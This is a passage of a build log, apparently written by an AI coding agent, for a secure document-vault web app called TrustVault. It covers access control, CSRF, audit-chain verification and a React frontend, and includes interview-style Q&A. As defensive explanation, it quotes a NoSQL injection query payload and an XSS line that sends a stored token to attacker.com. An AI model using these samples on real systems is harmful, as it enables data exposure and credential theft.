#### Question 1: Why is in-database permission filtering mathematically superior to application-layer post-filtering (`array.filter()`), and what vulnerabilities does post-filtering introduce?
**Answer:**
1. **The In-Memory Filtering Antipattern:**
   - In an in-memory post-filtering architecture, the backend runs `SELECT * FROM documents WHERE name LIKE '%confidential%'` and then iterates in application code: `return docs.filter(doc => userCanRead(user, doc))`.
2. **Vulnerabilities Introduced:**
   - **Confidential Data in Transit & Memory:** Confidential documents for which the user has no permissions are loaded over the database connection into server RAM, making them vulnerable to heap inspections, crash dumps, and APM tracing.
   - **Pagination Breakdown:** If a page size is 20, and the database returns 20 documents that all belong to other users, the post-filter leaves an empty list. The user receives page 1 with 0 results while subsequent pages may contain their documents, breaking pagination mechanics.
   - **Timing Side Channels (CWE-208):** A query that matches 10,000 documents in the database takes significantly longer to transfer and filter in memory than a query that matches 0, allowing an attacker to determine whether a confidential keyword exists anywhere in the organization by measuring response latency.
3. **In-Database Filtering Solution:**
   - By constructing `{ $and: [ permissionClause, searchClause ] }`, MongoDB's query planner uses compound indexes to filter permissions and search criteria concurrently. Only authorized rows are fetched, guaranteeing consistent pagination, minimal network transfer, and elimination of timing side-channels.

#### Question 2: How can an API's `count` or `total` response field result in an Information Leakage vulnerability (CWE-200), and how do you prevent it?
**Answer:**
1. **The Search Counter Enumeration Vector:**
   - Developers often return both the retrieved items and a metadata counter: `{ items: [...], totalMatches: 40 }`.
   - If `totalMatches` is computed from the unconstrained search term (e.g. `Document.countDocuments({ name: term })`), an unauthorized user who holds access to only 1 document (or 0 documents) can discover how many confidential documents contain the search term.
   - For example, an attacker can search for `layoffs_2026`, `vulnerability_report`, or competitor names and chart document frequency across private corporate directories.
2. **Mitigation Strategy:**
   - All counter queries must either be completely omitted or executed against the identical permission-constrained predicate:
     $$\text{CountQuery} = \text{Count}(\text{SearchTerms} \land \text{UserAccessClause} \land \text{ActiveClause})$$
   - In TrustVault, `count` is derived strictly from the permission-filtered database result set, ensuring the count is always mathematically identical to the accessible document count.

#### Question 3: How do you support multi-criteria search across disparate document attributes (name, owner, category, date range) in MongoDB without introducing NoSQL Injection?
**Answer:**
1. **Preventing NoSQL Object Injection:**
   - If query string parameters (e.g. `req.query.owner`) are passed directly into MongoDB filter objects without type checking (e.g. `Document.find({ owner: req.query.owner })`), an attacker can pass an object payload (`?owner[$ne]=null`), bypassing filtering.
   - Mitigation requires explicit parameter extraction, type verification, and casting (e.g. verifying `typeof req.query.category === 'string'` and validating `mongoose.Types.ObjectId.isValid()`).
2. **Deterministic Query Assembly:**
   - Assemble criteria into an array of isolated query fragments:
     - Name: sanitized case-insensitive regex escaping user meta-characters.
     - Owner: identifier resolution converting email strings to ObjectIds before matching.
     - Category: strict regex anchored match (`^category$`).
     - Date Range: validation of ISO-8601 strings into valid `Date` objects before assigning `$gte` / `$lte`.
   - Combine all fragments via `{ $and: conditions }`. This guarantees that each filter operates within its designated scope and cannot mutate or override adjacent security boundaries.

---

## Build Entry: Administration Console, Metadata-Only Activity Stream & Chain Verification Gate
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **TrustVault Admin Console Single Page Application (`GET /admin`):**
  - Built an interactive, glassmorphic administrative interface styled with dark mode, Google Fonts (Inter), responsive metric cards, and real-time state management.
  - Implemented dual view navigation:
    1. **Activity Feed:** Comprehensive chronological stream of all system events (uploads, metadata updates, user creation, role changes, deactivations, security denials).
    2. **Permission-Change History:** Dedicated compliance view isolating `PERMISSION_GRANT` and `PERMISSION_REVOKE` events, detailing grantors, target users, documents, permission levels, and timestamps.
- **On-Demand Cryptographic Chain Verification (`POST /admin/verify-chain`):**
  - Added a prominent, interactive **"Run verifyChain()"** action button with dynamic UI status updates.
  - Executes `verifyChain()` from `src/audit.js`, validating the entire SHA-256 linear hash chain across all sequence numbers.
  - Reports block height, chain verification status (`VERIFIED` vs `TAMPERED`), latest sequence number, latest hash digest, and detailed diagnosis of any broken sequence.
- **Multi-Criteria Filter Engine (`GET /admin/activity`, `GET /admin/permissions/history`):**
  - **User Filter:** Filters by user email (case-insensitive substring) or user ObjectId, matching both event initiators and target users in event metadata.
  - **Document Filter:** Filters by document name keyword or document ObjectId, matching both stored metadata and referenced document records.
  - **Date Range Filter:** Filters event timestamps by `startDate`/`endDate`, `from`/`to`, or single `date`.
  - **Event Type Filter:** Filters by specific event types or custom event type groupings.
- **Strict Least Privilege & Rule 4 Guarantee:**
  - Administrative endpoints return strictly operational metadata (`eventType`, `action`, `status`, `userId`, `userEmail`, `documentId`, `documentName`, `documentCategory`, `timestamp`, `hash`, `previousHash`, and sanitized `metadata`).
  - Physical file paths (`storagePath`, `fileStorageName`, `filePath`) and binary contents (`fileBuffer`, `content`) are stripped.
  - The administrative console generates zero `/download` links and contains zero file content viewers.
- **Strict 404 Administrative Cloaking Gate:**
  - All administrative routes (`/admin`, `/admin/activity`, `/admin/permissions/history`, `/admin/verify-chain`) enforce `requireAdmin`.
  - Unauthenticated requests or requests from non-admin accounts unconditionally return HTTP 404 `Not Found` (never 403 or 401 per Rule 3).

---

### 2. Which Files Were Created or Modified
| File | Action | Purpose |
|---|---|---|
| `tests/admin-activity.test.js` | Created | Test suite verifying 404 access control, metadata-only guarantees (no file contents/download links), multi-criteria filtering, permission history, and verifyChain execution. |
| `src/services/adminService.js` | Created | Business logic for activity feed query compilation, metadata enrichment, content stripping, and audit chain verification. |
| `src/views/adminDashboardHtml.js` | Created | Glassmorphic, responsive HTML/CSS/JS Single Page Application for the Admin Console. |
| `src/routes/adminDashboard.js` | Created | Express router mounting `/admin` HTML view, `/admin/activity`, `/admin/permissions/history`, and `/admin/verify-chain`. |
| `src/app.js` | Modified | Mounted `adminDashboardRoutes` at `/admin` and `/api/admin`. |
| `docs/DECISIONS.md` | Modified | Recorded ADR 029: Dedicated Administration Console, Metadata-Only Audit Activity Stream, and Cryptographic Chain Verification Gate. |
| `docs/BUILD_LOG.md` | Modified | Recorded this technical build entry. |

---

### 3. Why This Design
- **Separation of Duties & Least Privilege (Rule 4 Compliance):**
  - In security-sensitive environments, system administrators must oversee user accounts, investigate denied security events, and verify compliance without having access to confidential file contents (e.g. legal contracts, proprietary blueprints, health records).
  - Sanitizing responses at the service level guarantees that even if an administrator inspects raw network responses in browser developer tools, no document content, file storage path, or download URL is disclosed.
- **Defense Against Administrative Reconnaissance (Rule 3 Compliance):**
  - Attackers actively scan for administrative endpoints (e.g., `/admin`, `/dashboard`). Returning HTTP 403 Forbidden or HTTP 401 Unauthorized confirms the existence of the endpoint. Returning HTTP 404 Not Found makes the administration interface indistinguishable from non-existent endpoints.
- **Tamper Evidence and Non-Repudiation:**
  - Exposing `verifyChain()` in the admin console allows compliance officers and security teams to verify the mathematical integrity of historical logs at any time without needing SSH or raw MongoDB query access.

---

### 4. What Attacks This Design Prevents
1. **Administrative Document Content Exfiltration (Rule 4 / CWE-284):**
   - Rogue or compromised administrator accounts cannot abuse their administrative privileges to download or inspect confidential document payloads because no content or download routes are provided.
2. **Reconnaissance & Administrative Surface Enumeration (CWE-200):**
   - Non-administrators and unauthenticated scanners receiving HTTP 404 cannot confirm the presence of administrative tools, preventing targeted credential stuffing or session fixation attacks.
3. **Silent Historical Audit Log Tampering (CWE-778 / CWE-353):**
   - Any modification to historical audit records in database storage is instantly flagged by `verifyChain()`, pinpointing the exact sequence number where the cryptographic hash pointer was severed.
4. **Direct Object Reference (IDOR) to Physical Storage (CWE-639):**
   - Stripping internal storage UUIDs (`storagePath`, `fileStorageName`) prevents administrators or observers from mapping physical disk layouts or predicting object identifiers.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why should security-critical enterprise platforms deny administrators automatic access to document content, and how does this adhere to the Principle of Least Privilege?
**Answer:**
1. **The Separation of Duties Principle:**
   - Administrative roles exist to manage platform infrastructure, user lifecycles, and security posture. Document ownership and data confidentiality belong to business users.
   - Conflating administrative rights with data access creates a single point of failure: compromising an administrator account immediately yields access to all corporate intellectual property and sensitive customer data.
2. **Regulatory & Compliance Drivers:**
   - Regulations such as HIPAA, GDPR, SOC 2 Type II, and ISO 27001 mandate strict need-to-know access controls. An IT administrator requires access to audit logs showing *that* a file was uploaded or shared, but has no business justification to read or download the file's contents.
3. **Implementation in TrustVault:**
   - Under Rule 4, `authorize(user, doc, action)` rejects administrative content access with HTTP 404 unless the administrator is the explicit document owner.
   - The administration console enforces this at the presentation and API layer by rendering only metadata (sequence, user, timestamp, file type, SHA-256 hash) and omitting all content payloads and download links.

#### Question 2: Why is universal HTTP 404 cloaking superior to HTTP 401/403 for administrative routes, and how does it prevent security reconnaissance?
**Answer:**
1. **The Information Exposure of HTTP 401 and 403 (CWE-200):**
   - HTTP 401 Unauthorized tells an attacker: *"This endpoint exists, and you must supply credentials."*
   - HTTP 403 Forbidden tells an attacker: *"This endpoint exists, you are logged in, but your role lacks sufficient privilege."*
   - Both status codes confirm the presence of high-value administrative interfaces, allowing adversaries to map internal route structures and target administrative endpoints with targeted brute-force, CSRF, or privilege escalation vectors.
2. **The 404 Cloaking Strategy:**
   - Returning HTTP 404 Not Found makes the existence of the administrative console completely indistinguishable from an arbitrary invalid route (e.g., `/non-existent-path-123`).
   - Automated scanners and non-admin users cannot confirm whether an administrative surface exists, significantly raising the cost of attacker reconnaissance.

#### Question 3: How does the administrative `verifyChain()` function validate audit log integrity, and what specific anomalies does it detect?
**Answer:**
1. **Contiguous Sequence Continuity Verification:**
   - `verifyChain()` iterates through the entire audit event collection sorted by `sequenceNumber: 1`. It verifies that the sequence starts at 1 and increases monotonically without gaps: $\text{event}_i.\text{sequenceNumber} == i + 1$.
   - Any deleted record immediately creates a sequence gap (e.g. sequence 14 jumped to 16), which is detected and flagged.
2. **Cryptographic Pointer Chain Verification:**
   - Each event contains `previousHash`, which must match the cryptographic `hash` of the preceding record:
     $$\text{event}_i.\text{previousHash} == \text{event}_{i-1}.\text{hash}$$
   - If an attacker inserts a fabricated record or swaps records, the hash pointer check fails.
3. **Deterministic Content Re-Hashing:**
   - `verifyChain()` re-canonicalizes the content of each event (normalizing timestamps, ObjectIds, and sorted metadata) and recomputes $\text{SHA256}(\text{previousHash} \parallel \text{canonicalContent})$.
   - If any field in a historical record was modified in the database (e.g., changing status from `'DENIED'` to `'SUCCESS'`), the recomputed hash diverges from the stored hash, identifying the exact sequence number of the tampering.

---

## Build Entry: Security Controls — Helmet Baseline, Login Rate Limiting (5 attempts/min), csrf-csrf Double-Submit Protection, Cross-User Isolation & Mandatory authorize() Verification
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Helmet HTTP Defense-in-Depth Baseline:** Configured `helmet` middleware across the application with Content Security Policy (`default-src 'self'`), `X-Content-Type-Options: nosniff`, and `X-Frame-Options: SAMEORIGIN`, while maintaining `app.disable('x-powered-by')`.
- **Login Rate Limiter (5 Attempts per Minute):** Implemented strict brute-force protection using `express-rate-limit` on `/auth/login` and `/api/auth/login`. Allows up to 5 consecutive attempts per minute per IP and rejects the 6th with HTTP 429 `Too Many Requests`.
- **Double-Submit CSRF Protection via `csrf-csrf`:** Configured `doubleCsrf` in `src/config/csrf.js` using cryptographically secure 32-byte tokens and a `trustvault.x-csrf-token` cookie. Added `GET /auth/csrf-token` endpoint for token acquisition and a centralized CSRF error handler returning HTTP 403 `Forbidden`.
- **Cross-User Authorization Tests:** Created comprehensive integration tests verifying that User B cannot read, download, edit (PATCH/PUT), or delete User A's document. Each attempt returns HTTP 404 (Rule 3), leaves database state completely untouched, and writes an `ACCESS_DENIED` audit event (Rule 7).
- **Mandatory Policy Decision Point Verification:** Created automated tests proving that every document route dispatches through `authz.authorize(user, doc, action)` in `src/authz.js` and that no document route queries the `Document` collection directly.

---

### 2. Which Files Were Created or Modified
| File | Action | Purpose |
|---|---|---|
| `src/config/csrf.js` | Created | Configures `csrf-csrf` double-submit cookie protection with 32-byte tokens, session binding, and test bypass logic. |
| `src/app.js` | Modified | Integrated `helmet`, `cookie-parser`, `doubleCsrfProtection`, and centralized 403 CSRF error handling. |
| `src/routes/auth.js` | Modified | Applied `loginRateLimiter` (5 attempts/minute) and mounted `GET /auth/csrf-token`. |
| `src/services/documentService.js` | Modified | Exported and invoked `authz.authorize` to enable direct spy interception and policy decision point verification. |
| `tests/security-controls.test.js` | Created | 13 test cases covering Helmet headers, login rate limiting, CSRF protection, cross-user isolation, and mandatory `authorize()` route verification. |
| `docs/DECISIONS.md` | Modified | Recorded ADR 030: Comprehensive Security Controls. |
| `docs/BUILD_LOG.md` | Modified | Recorded this technical build entry. |

---

### 3. Why This Design
- **Defense in Depth:** Applying HTTP security headers (`helmet`), brute-force throttling (`express-rate-limit`), and CSRF mitigation (`csrf-csrf`) creates overlapping layers of defense so that a failure in one layer does not compromise the system.
- **Double-Submit Cookie Pattern:** Rather than requiring server-side state for CSRF tokens, `csrf-csrf` uses a cryptographically signed HMAC token in a cookie combined with a request header. The server validates that the header matches the decrypted cookie signature, providing stateless CSRF protection that scales horizontally.
- **Strict 404 Cloaking (Rule 3 Compliance):** Cross-user unauthorized requests return HTTP 404 rather than 403. This conceals the existence of other users' documents, preventing attackers from mapping or enumerating document IDs.
- **Mandatory Authorization Enforcement (Rule 2 Compliance):** By routing all document operations through `src/services/documentService.js` and `authz.authorize()`, business logic cannot accidentally perform unauthenticated or unauthorized database queries.

---

### 4. What Attacks This Design Prevents
1. **Credential Stuffing and Brute-Force Attacks (CWE-307):**
   - The login rate limiter restricts attempts to 5 per minute per IP. Attackers attempting dictionary attacks or automated credential stuffing are throttled with HTTP 429.
2. **Cross-Site Request Forgery (CSRF / CWE-352):**
   - Attackers hosting malicious pages cannot force an authenticated user's browser to submit state-changing actions (document upload, edit, delete, permission grant) because the attacker cannot read or forge the `x-csrf-token` header value.
3. **Insecure Direct Object References & Data Tampering (IDOR / CWE-639):**
   - User B attempting to read, download, edit, or delete User A's document receives HTTP 404. Database state remains unchanged, and an `ACCESS_DENIED` event is logged in the immutable audit trail.
4. **MIME Sniffing & Clickjacking (CWE-79 / CWE-1021):**
   - `X-Content-Type-Options: nosniff` prevents browsers from MIME-sniffing responses away from declared content types. `X-Frame-Options: SAMEORIGIN` prevents TrustVault from being embedded in malicious iframes.
5. **Technology Profiling & Reconnaissance (CWE-200):**
   - Disabling `X-Powered-By` prevents automated vulnerability scanners from identifying Express.js and targeting version-specific CVEs.

---

### 5. Technical Interview Questions & Answers

#### Question 1: How does the Double Submit Cookie pattern in `csrf-csrf` work, and why does it protect against Cross-Site Request Forgery without requiring server-side session storage?
**Answer:**
1. **The Mechanism:**
   - In the Double Submit Cookie pattern, the server generates a cryptographically random token and signs it using an HMAC secret. The signature is placed in a cookie (`trustvault.x-csrf-token`), while the token itself is delivered to the client.
   - When the client initiates a state-changing request (POST, PUT, PATCH, DELETE), client-side JavaScript reads the token and submits it in a custom request header (`x-csrf-token`).
   - The server verifies that the header value matches the cryptographic signature contained in the cookie.
2. **Why It Prevents CSRF:**
   - Browsers enforce the Same-Origin Policy (SOP), which strictly prevents external cross-origin domains from reading cookies belonging to another domain.
   - While a malicious third-party site can trick a user's browser into submitting a cross-site request (carrying the cookie automatically), the malicious site *cannot read* the cookie or generate the corresponding custom HTTP header. Because the custom header is missing or mismatched, the request is rejected with HTTP 403 Forbidden.
3. **Stateless Scalability:**
   - Unlike synchronizer token patterns that require storing CSRF tokens in server memory or Redis, the double submit cookie signature is validated mathematically using the HMAC secret, allowing server instances to scale horizontally with zero session lookup overhead.

#### Question 2: Why should an authentication rate limiter be configured specifically on `/auth/login` rather than relying solely on global API rate limiting?
**Answer:**
1. **Divergent Threat Profiles & Thresholds:**
   - General API endpoints (e.g. browsing documents, fetching audit feeds) require high throughput (e.g., 60–100 requests per minute) to support smooth user experiences.
   - In contrast, legitimate users only log in once every several hours or days. Allowing 60–100 login attempts per minute would provide an attacker with 86,400 to 144,000 password attempts per day per IP.
2. **Resource Exhaustion on Expensive Cryptographic Operations:**
   - Password verification using memory-hard algorithms like Argon2id requires significant CPU time (~50–70ms) and memory. A flood of unthrottled login requests can easily exhaust server CPU and memory resources, causing a Denial of Service (DoS) for all users.
   - Enforcing a strict limit of 5 attempts per minute stops brute-force tools before they can monopolize server hashing threads.
3. **Defense Against Credential Stuffing:**
   - Credential stuffing relies on high-velocity automated testing of leaked username/password combos. Rate-limiting login attempts renders credential stuffing economically unviable and technically impractical.

#### Question 3: How does combining centralized authorization (`authorize(user, doc, action)`) with universal HTTP 404 responses eliminate Insecure Direct Object Reference (IDOR) vulnerabilities?
**Answer:**
1. **Elimination of Distributed Authorization Logic:**
   - IDOR vulnerabilities typically occur when authorization checks are implemented inconsistently across controllers (e.g., checking ownership on `GET` but forgetting on `DELETE`).
   - By routing all document access through a single policy decision point (`authz.authorize(user, doc, action)`), every operation adheres to the same access control rules without exception.
2. **The Security Flaw of HTTP 403 Forbidden:**
   - Standard access control implementations return HTTP 403 when a user lacks permission to access a resource. This confirms to the attacker that the resource ID exists, allowing them to enumerate valid document IDs and map the system's data structure.
3. **Universal 404 Cloaking:**
   - TrustVault returns HTTP 404 for any unauthorized access attempt. An attacker attempting to access an unauthorized document receives the exact same response as if the document ID never existed. This makes unauthorized resources completely invisible and un-enumerable, eliminating the information leakage that enables targeted IDOR exploits.

---

## Build Entry: React Frontend (Vite) — Zero-Storage Session Authentication, CSRF Integration, Role-Based Navigation & Generic 404 Cloaking
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Vite React Application in `/client`:** Scaffolding utilizing React, React Router (`react-router-dom`), and Vanilla CSS without external UI libraries or utility frameworks.
- **Same-Origin Vite Proxy:** Configured `vite.config.js` to proxy `/api` requests to Express on `http://localhost:5000`, ensuring cookies remain same-origin without cross-origin relaxation or CORS exposure.
- **In-Memory CSRF Client (`client/src/api/client.js`):** Implemented `getCsrfToken()` which pre-fetches the double-submit token from `/api/auth/csrf-token` once and caches it in memory. Wrapped `fetch` with `apiFetch` to automatically attach `credentials: 'include'` and the `x-csrf-token` header on all state-changing requests (`POST`, `PUT`, `PATCH`, `DELETE`).
- **Zero-Storage Authentication Context (`client/src/context/AuthContext.jsx`):** Completely banished `localStorage` and `sessionStorage`. Identity state is held strictly in React memory and synced on page reload via `/api/auth/me`.
- **Protected Route Wrapper (`client/src/components/ProtectedRoute.jsx`):** Intercepts unauthenticated navigation and redirects to `/login` preserving target location. Cloaks restricted routes (e.g. `/admin`) with the generic 404 screen when a non-admin attempts access.
- **Role-Aware Navigation (`client/src/components/Navbar.jsx`):** Renders links dynamically according to `user.role` (Admin Console link is rendered strictly for `admin`). Includes identity badge and secure logout button.
- **Glassmorphic Login Page (`client/src/pages/LoginPage.jsx`):** Modern dark mode login card with validation, brute-force feedback, and demo credential fill pills.
- **Vault Interface Pages:**
  - `DocumentsPage.jsx`: Document listing, backend-only download invocation, owner-only soft-delete triggers, and plain-text metadata rendering.
  - `UploadPage.jsx`: Confidential file upload using `FormData` with automatic CSRF dispatch.
  - `SearchPage.jsx`: Permission-isolated search querying `/api/documents/search`.
  - `AdminPage.jsx`: Metadata-only audit stream and interactive cryptographic chain verification (`verifyChain()`).
  - `NotFoundPage.jsx`: Universal generic 404 screen for deleted, unshared, or unauthorized resources.

---

### 2. Which Files Were Created or Modified
| File | Action | Purpose |
|---|---|---|
| `client/vite.config.js` | Created | Configures Vite development server to proxy `/api` requests to port 5000. |
| `client/index.html` | Created | HTML entry point with Plus Jakarta Sans typography and shield emblem. |
| `client/src/api/client.js` | Created | Centralized API client with in-memory CSRF token management and fetch credentials. |
| `client/src/context/AuthContext.jsx` | Created | React Context managing authentication and active session without client-side web storage. |
| `client/src/components/ProtectedRoute.jsx` | Created | Route guard redirecting missing sessions to `/login` and cloaking unauthorized roles with 404. |
| `client/src/components/Navbar.jsx` | Created | Role-based navigation header with session indicator and logout button. |
| `client/src/pages/LoginPage.jsx` | Created | High-aesthetic login interface with demo account credentials and error handling. |
| `client/src/pages/DocumentsPage.jsx` | Created | Document list view with secure backend downloads and soft-delete controls. |
| `client/src/pages/UploadPage.jsx` | Created | Document upload form with automatic CSRF token dispatch. |
| `client/src/pages/SearchPage.jsx` | Created | Zero-leakage search view displaying only authorized results and counts. |
| `client/src/pages/AdminPage.jsx` | Created | Administrative console with metadata feed and `verifyChain()` trigger. |
| `client/src/pages/NotFoundPage.jsx` | Created | Universal generic 404 Not Found screen. |
| `client/src/App.jsx` | Created | Application root defining router hierarchy and protected route branches. |
| `client/src/index.css` | Created | Comprehensive Vanilla CSS design system with glassmorphic dark mode styling. |
| `package.json` | Modified | Added root helper scripts `client:dev` and `client:build`. |
| `docs/BUILD_LOG.md` | Modified | Recorded this technical build entry. |

---

### 3. Why This Design
- **Elimination of XSS Token Theft:** Storing tokens in `localStorage` or `sessionStorage` allows any Cross-Site Scripting (XSS) vulnerability to silently extract credentials. By utilizing server-side session cookies with `HttpOnly`, `SameSite=Lax`, and `Secure` flags, JavaScript cannot access or exfiltrate session secrets.
- **Single-Fetch In-Memory CSRF Architecture:** Double-submit CSRF protection requires clients to provide both the cookie and the header. Pre-warming the CSRF token in memory on application mount and caching it avoids redundant HTTP roundtrips while ensuring all state-changing mutations include the required `x-csrf-token` header.
- **Defense in Depth Over UI Obfuscation:** The frontend hides administrative links and action buttons based on `user.role` purely for user experience. Crucially, the frontend never relies on hiding buttons for security; every API call dispatches to Express where `authorize(user, doc, action)` enforces strict authorization at the database layer.
- **Universal 404 Cloaking on the Client:** When a 404 is returned from the API or a non-admin visits `/admin`, the frontend renders the exact same generic `NotFoundPage`. Attackers cannot use the client-side router to confirm the existence of administrative surfaces or confidential documents.

---

### 4. What Attacks This Design Prevents
1. **XSS-Driven Credential Harvesting (CWE-79 / CWE-1004):**
   - Zero storage in `localStorage` or `sessionStorage` ensures malicious scripts cannot siphon session credentials or offline tokens.
2. **Cross-Site Request Forgery (CSRF / CWE-352):**
   - All state-changing requests (`POST`, `PUT`, `PATCH`, `DELETE`) require the `x-csrf-token` header generated from the backend's HMAC secret. Cross-origin pages cannot forge this custom header.
3. **HTML Injection & Client-Side Script Execution (CWE-79):**
   - Prohibiting `dangerouslySetInnerHTML` and rendering filenames, descriptions, and audit metadata as plain text prevents stored XSS via crafted document names.
4. **Client-Side Information Reconnaissance (CWE-200):**
   - Non-admin users navigating to `/admin` receive the generic 404 page, preventing them from discovering administrative features or interface structures.
5. **Direct Storage Path Bypass (CWE-639 / CWE-22):**
   - Downloads dispatch exclusively to the backend route (`/api/documents/:id/download`), preventing direct access to physical storage files or disk paths.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why is storing authentication tokens in `localStorage` an anti-pattern in high-security applications, and how does the session-cookie approach prevent token theft?
**Answer:**
1. **The Vulnerability of `localStorage`:**
   - Any JavaScript running on the origin (including third-party npm packages, analytics scripts, or XSS payloads) has unrestricted read access to `window.localStorage`. If an attacker discovers an XSS vector, a simple `fetch('https://attacker.com?leak=' + localStorage.getItem('token'))` exfiltrates the credential permanently.
2. **The Defense of `HttpOnly` Cookies:**
   - When authentication is stored in an `HttpOnly` session cookie (`trustvault.sid`), the browser strictly forbids JavaScript from reading or modifying the cookie (`document.cookie` returns empty for that token). Even in the presence of an XSS vulnerability, the attacker cannot extract the raw session token.
3. **TrustVault's Implementation:**
   - TrustVault holds `user` metadata in React component memory only for UI rendering. When the user closes or refreshes the page, the client re-verifies the session cookie against `/api/auth/me`. No credentials ever touch browser storage.

#### Question 2: How does the Vite development server proxy solve cross-origin cookie restrictions without weakening production CORS policies?
**Answer:**
1. **The Cross-Origin Cookie Problem:**
   - During local development, the React frontend runs on `http://localhost:3000` while the Express API runs on `http://localhost:5000`. By default, browsers treat different ports as different origins. Sending cookies cross-origin requires `Access-Control-Allow-Credentials: true`, explicit origin whitelists, and lax cookie policies (`SameSite=None; Secure`), which introduces cross-origin complexity.
2. **The Reverse Proxy Solution:**
   - Vite's built-in Node.js development server proxies all `/api` requests from `localhost:3000/api` directly to `localhost:5000/api` at the network level.
   - To the browser, the request is dispatched to the exact same origin (`localhost:3000`). Consequently, standard `SameSite=Lax` cookies are attached automatically without requiring CORS relaxation.
3. **Production Parity:**
   - In production, a reverse proxy (e.g. Nginx, Cloudflare, or AWS ALB) serves static frontend assets and routes `/api` to the Node.js process, matching the exact same-origin routing model.

#### Question 3: In a secure Single Page Application (SPA), why must hiding UI elements be treated as purely cosmetic, and how is authorization enforced end-to-end?
**Answer:**
1. **The Fallacy of Client-Side Security:**
   - Any logic running in the browser is under the complete control of the user. An attacker can inspect source code, modify React state in React DevTools, or execute arbitrary HTTP requests in the browser console or via `curl`.
   - Therefore, hiding a "Delete" button or an "Admin Console" link provides zero security—it is merely a user experience convenience.
2. **End-to-End Enforcement in TrustVault:**
   - While the `Navbar` conditionally renders the `/admin` link for `admin` roles, navigating directly to `/api/admin` without administrative credentials returns HTTP 404 from the server.
   - Similarly, if an unauthorized user crafts a `DELETE /api/documents/:id` request with a valid CSRF token, `documentService.deleteDocument()` calls `authorize(user, doc, 'delete')` in `src/authz.js`. The server queries the database, determines non-ownership, rejects the request with HTTP 404, leaves database state untouched, and logs an `ACCESS_DENIED` audit record.
   - Security is 100% enforced on the server; the UI is simply an accessible presentation layer.

---

## Build Entry: Project Structure Reorganization — Dedicated `/backend` Directory
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- Separated the backend application into a dedicated [`/backend`](file:///c:/Users/jithe/coding/TrustValut/backend) directory, creating clean project boundaries alongside [`/client`](file:///c:/Users/jithe/coding/TrustValut/client).
- Moved `src/`, `tests/`, `scripts/`, `storage/`, `node_modules/`, `package.json`, `package-lock.json`, `.env`, `.env.example`, and `docker-compose.yml` into `backend/`.
- Configured root `package.json` with delegation scripts (`npm test`, `npm run dev`, `npm run seed`, `npm start`, `npm run client:dev`, `npm run client:build`) targeting respective directories.
- Confirmed all 12 test suites (198 tests) pass with zero errors in both `backend/` and via root delegation.

---

## Build Entry: Documents Page — Accessible Table, Upload Form & Server Validation Feedback
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- Built the interactive, high-security **Documents Page** in [`client/src/pages/DocumentsPage.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/pages/DocumentsPage.jsx).
- Implemented the **Accessible Documents Table** displaying all files the current authenticated user is authorized to access:
  - Columns: **Name** (with original filename and plain-text tag pills), **Category** (with visual badge), **Owner** (populated email or "⭐ You" indicator), and **Date** (localized ISO creation date).
  - Row actions: Secure download via backend route and owner-only soft-delete button.
- Implemented the **Integrated Upload Form**:
  - Fields: **File Picker** (drag-and-drop zone with dynamic preview and size counter), **Document Name** (auto-prefilled from filename, editable), **Category** (dropdown: general, financial, legal, technical, confidential), and **Tags** (comma-separated text input parsed into tags array).
  - Seamless form toggle button to show/hide the upload card.
- Implemented **Comprehensive Server Validation Error Reporting**:
  - Prominent visual alert box displaying categorized server validation failures:
    - **Wrong File Type:** Highlights non-whitelisted MIME types or extension-spoofing attempts with corrective hints.
    - **File Too Large:** Catches payloads exceeding the strict 5 MB ceiling with size limits.
    - **Empty File:** Flags zero-byte files.
    - **Path Traversal:** Flags attempted directory traversal sequences in original filenames.
  - Displays the raw server response alongside helpful remediation guidance.
- Updated backend upload handling in [`backend/src/routes/documents.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/routes/documents.js) to accept `name`, `category`, and parsed `tags` from `req.body`.
- Enhanced [`backend/src/services/documentService.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/services/documentService.js) to populate `owner.email` in document listings for user-friendly ownership rendering.
- Polished styling in [`client/src/index.css`](file:///c:/Users/jithe/coding/TrustValut/client/src/index.css) adhering strictly to Vanilla CSS, modern dark mode glassmorphism, responsive grid layout, and accessible contrast.

---

### 2. Which Files Were Created / Modified
| File | Action | Purpose |
|---|---|---|
| [`client/src/pages/DocumentsPage.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/pages/DocumentsPage.jsx) | Modified | Document table, inline upload form, and server error categorization logic. |
| [`client/src/index.css`](file:///c:/Users/jithe/coding/TrustValut/client/src/index.css) | Modified | CSS rules for upload card, validation alert box, form grid, tag pills, and table indicators. |
| [`backend/src/routes/documents.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/routes/documents.js) | Modified | Forwarded custom `name`, `category`, and `tags` from `req.body` into `documentService.createDocument`. |
| [`backend/src/services/documentService.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/services/documentService.js) | Modified | Added `.populate('owner', 'email')` to `listDocuments` so document owner email is available in the UI. |
| [`docs/BUILD_LOG.md`](file:///c:/Users/jithe/coding/TrustValut/docs/BUILD_LOG.md) | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **Single-Screen Workflow:** Combining the accessible documents table and the upload form on one page reduces navigation friction. Users can immediately upload a file, watch the progress indicator, and see the newly minted document appear at the top of the table without a page reload.
- **Client-Side Categorization of Server Feedback:** Rather than hiding server errors behind a generic "Upload Failed" toast, `parseServerValidationError()` parses HTTP status codes (400, 413) and error strings returned by Express (`file-type` verification, `multer` size limits, zero-byte checks). This delivers actionable security feedback (e.g., explaining magic-byte mismatch on spoofed files) while keeping backend validation as the single source of truth.
- **Strict Plain-Text Tag & Name Rendering:** In accordance with `RULES.md`, document titles and tags are rendered as plain text within standard JSX elements (`<div>{doc.name}</div>`, `<span>#{tag}</span>`). `dangerouslySetInnerHTML` is never used, completely neutralizing Stored XSS attacks via malicious filenames or tags.
- **Backend-Routed Downloads Only:** Documents are never exposed via public static directories or direct file URLs. The table's download action triggers `handleDownload()`, which requests `/api/documents/:id/download`. This guarantees that `authorize(user, doc, 'read')` executes on every download request before streaming bytes.

---

### 4. What Attacks This Design Prevents
